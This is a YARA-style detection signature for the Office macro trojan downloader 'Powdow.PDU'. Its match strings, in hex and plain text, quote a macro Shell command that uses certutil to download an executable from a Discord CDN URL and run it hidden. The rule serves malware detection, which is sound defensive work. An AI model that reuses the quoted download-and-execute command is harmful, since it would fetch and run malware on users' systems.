
rule TrojanDownloader_O97M_Powdow_PDU_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.PDU!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 73 3a 2f 2f 63 64 6e 2e 64 69 73 63 6f 72 64 61 70 70 2e 63 6f 6d 2f 61 74 74 61 63 68 6d 65 6e 74 73 2f 37 34 35 31 36 33 30 31 37 39 35 31 36 34 31 36 34 30 2f 39 34 30 35 31 30 32 30 31 36 34 32 31 30 36 39 30 30 2f 6e 65 77 5f 6c 69 66 65 5f 34 2e 65 78 65 22 } //1 = Shell("cmd /c certutil.exe -urlcache -split -f ""https://cdn.discordapp.com/attachments/745163017951641640/940510201642106900/new_life_4.exe"
		$a_01_1 = {2e 65 78 65 2e 65 78 65 20 26 26 20 4d 6b 77 79 6f 61 66 71 70 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29 } //1 .exe.exe && Mkwyoafqp.exe.exe", vbHide)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}